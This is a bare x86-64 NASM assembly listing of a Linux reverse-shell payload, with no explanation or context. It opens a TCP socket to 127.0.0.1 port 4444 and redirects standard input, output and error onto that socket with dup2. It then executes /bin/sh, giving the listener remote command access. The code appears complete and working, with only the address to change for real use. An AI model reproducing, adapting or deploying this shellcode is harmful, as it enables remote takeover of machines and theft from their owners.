global _start

_start:
    ;; struct sockaddr
    mov     rbp, rsp
    push    0           ; padding
    push    16777343    ; pton(127.0.0.1) = pton(0x7f000001) = 0x0100007f
    push    word 0x5c11 ; 4444
    push    word 0x02   ; AF_INET
    
    ;; socket()
    mov     rdi, 2
    mov     rsi, 1
    mov     rdx, 0
    mov     rax, 41
    syscall
    
    ;; sock_fd
    mov     rdi, rax
    ;; connect()
    mov     rsi, rsp
    mov     rdx, rbp
    sub     rdx, rsp
    mov     rax, 42
    syscall
    
    xor     r8, r8
    ;; dup2()
dup:
    mov     rsi, r8
    mov     rax, 33
    syscall
    inc     r8
    cmp     r8, 3
    jne     dup
    
    ;; execve()
    xor     rsi, rsi
    xor     rdx, rdx
    mov     rdi, exec
    mov     rax, 59
    syscall
    
section .data
    exec:   db  "/bin/sh",0
